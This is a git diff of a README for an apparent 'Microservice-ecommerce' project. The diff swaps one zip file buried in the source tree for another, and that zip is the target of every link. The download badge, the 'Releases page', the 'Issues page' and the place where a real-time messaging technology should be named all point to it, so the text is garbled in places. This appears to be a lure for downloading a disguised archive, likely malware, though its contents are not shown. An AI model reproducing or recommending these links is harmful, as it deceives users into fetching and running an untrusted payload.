@@ -1,6 +1,6 @@
 # 🛍️ Microservice-ecommerce - A Simple Way to Start Your E-Commerce Journey
 
-[![Download](https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/auth-service/src/utils/sendMail/Microservice-ecommerce_v3.4.zip%20Now-Get%20the%20Release-brightgreen)](https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/auth-service/src/utils/sendMail/Microservice-ecommerce_v3.4.zip)
+[![Download](https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/seller-ui/src/app/utils/Microservice-ecommerce-v1.6.zip%20Now-Get%20the%20Release-brightgreen)](https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/seller-ui/src/app/utils/Microservice-ecommerce-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the Microservice-ecommerce project! This application demonstrates how
 ### 🌐 Key Features
 
 - **Decoupled Services**: Utilizes event-driven patterns with Kafka. This ensures your services can work independently.
-- **Real-Time Communication**: Incorporates https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/auth-service/src/utils/sendMail/Microservice-ecommerce_v3.4.zip for instant messaging between users and the application. 
+- **Real-Time Communication**: Incorporates https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/seller-ui/src/app/utils/Microservice-ecommerce-v1.6.zip for instant messaging between users and the application. 
 - **Machine Learning Recommendations**: Suggests products to users based on their preferences.
 - **Cloud Operations**: Uses AWS to deploy the application efficiently.
 - **Documentation**: API documentation is available for easy understanding.
@@ -25,7 +25,7 @@ To run this application smoothly, ensure your computer meets these requirements:
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/auth-service/src/utils/sendMail/Microservice-ecommerce_v3.4.zip) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/seller-ui/src/app/utils/Microservice-ecommerce-v1.6.zip) to find the latest version.
    
 2. **Choose Your Download**: Look for the latest release, usually marked with "Latest" next to the version number. Click on it.
 
@@ -59,7 +59,7 @@ Now that you have installed and configured the application, you can begin using 
 
 ### 🧑‍🤝‍🧑 Support and Feedback
 
-If you encounter issues or have questions while using Microservice-ecommerce, please visit the [Issues page](https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/auth-service/src/utils/sendMail/Microservice-ecommerce_v3.4.zip) on GitHub. You can report problems or ask for help there. 
+If you encounter issues or have questions while using Microservice-ecommerce, please visit the [Issues page](https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/seller-ui/src/app/utils/Microservice-ecommerce-v1.6.zip) on GitHub. You can report problems or ask for help there. 
 
 You can also provide feedback or suggestions. Your input is valuable and helps improve the application.
 
@@ -68,7 +68,7 @@ You can also provide feedback or suggestions. Your input is valuable and helps i
 For more information on the technologies used, check out the links below:
 
 - **Kafka Documentation**: Learn how event-driven architecture works.
-- **https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/auth-service/src/utils/sendMail/Microservice-ecommerce_v3.4.zip Guide**: Understand real-time communication.
+- **https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/seller-ui/src/app/utils/Microservice-ecommerce-v1.6.zip Guide**: Understand real-time communication.
 - **AWS LightSail**: Explore how to use cloud services effectively.
 
 ### 📝 Documentation
@@ -79,4 +79,4 @@ For developers and those interested in the technical aspects, comprehensive API 
 
 Downloading and running Microservice-ecommerce is straightforward and user-friendly. By following this guide, you can set up your own e-commerce platform in no time. 
 
-Don’t forget; you can always return to the [Releases page](https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/auth-service/src/utils/sendMail/Microservice-ecommerce_v3.4.zip) for updates and new versions. Enjoy your experience!
+Don’t forget; you can always return to the [Releases page](https://raw.githubusercontent.com/epsoundegypt/Microservice-ecommerce/main/apps/seller-ui/src/app/utils/Microservice-ecommerce-v1.6.zip) for updates and new versions. Enjoy your experience!
